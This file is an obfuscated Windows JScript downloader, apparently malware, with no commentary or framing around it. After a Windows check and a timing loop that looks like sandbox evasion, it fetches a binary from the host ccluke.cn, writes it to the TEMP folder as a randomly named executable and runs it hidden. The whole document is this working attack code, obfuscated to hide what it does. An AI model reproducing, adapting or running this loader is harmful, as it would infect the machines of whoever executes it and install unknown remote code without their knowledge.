var _EA = false;
var _BE = "CreateObject";
var _ZN = function _KZ() {return WScript[_BE]("WScript"+".Shell");}(), _OJ = 11;
var _A = "MSXML2.XMLHTTP";
var _IO = 2123213;
var _LK = 0;
function _ZZ(_IR){_ZN["Run"](_IR, _LK, _LK);};
function _LD(){return _A + "";};
function _T(_EZ, _IC){_LK = _LK * 1; return _EZ - _IC;};
function _YW(){return _BE;};
/*@cc_on
  @if (@_win32 || @_win64)
    _EA = true;
  @end
@*/
if (_EA)
{
var _H = "";
function _G(){return 22;};
var _Q1 = 0; var _MR = 0;
function _TX()
{
var _TF = new this["Date"]();
var _I1 = _TF["getUTCMilliseconds"]();
WScript["Sleep"](_G());
var _TF = new this["Date"]();
var _VM = _TF["getUTCMilliseconds"]();
WScript["Sleep"](_G());
var _TF = new this["Date"]();
var _O = _TF["getUTCMilliseconds"]();
var _Q1 = "_BF";
_Q1 = _T(_VM, _I1);
var _MR = "_L";
_MR = _T(_O, _VM);
_H = "open";
return _T(_Q1, _MR);
}
var _KX = false;
var _T0 = false;
for (var _X = _LK; _X < _G() * 1; _X++){if (_TX() != _LK){
_KX = true; 
_MR = "31" + 11 * _Q1 + _MR; 
_T0 = true; 
break;
}}
function _N() {return ((_KX == true) && (_KX == _T0)) ? 1 : _LK;};
if (_KX && _N() && _T0){
function _U() {return _ZN["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ZNGoDR8pKlJESKAY.ex" + "e";};
 _AF = _LD();
 _XC = WScript[_BE](_AF);
 var _QQ = 1;
 while (_QQ){
try {
	if (_QQ == 1)
	{
		_XC[_H]("GET", "http://ccluke.cn/b7eus", false);
		_XC["send"]();
		_Q0 = "Sleep";
	}
	WScript[_Q0](_G() + 120); 
	if (_XC["readystate"] < 2 * 2) continue;
	_QQ = _LK;
	function _I(_Q) {var _DE = (1, 2, 3, 4, 5, _Q); return _DE;};
	_SN = WScript[_YW()]("ADODB.Stream");
	_AF = _SN;
	_AF[_H]();
	_AF["type"] = _I(1);
	_AF["write"](_XC["ResponseBody"]);
	_SN["position"] = _I(_LK);
	_AF["Save" + "ToFile"](_U(), 2);
	_SN["cl"+"ose"]();
	_I0 = _U();
	_ZZ(_I0);
} catch(_B){};
}
}
}

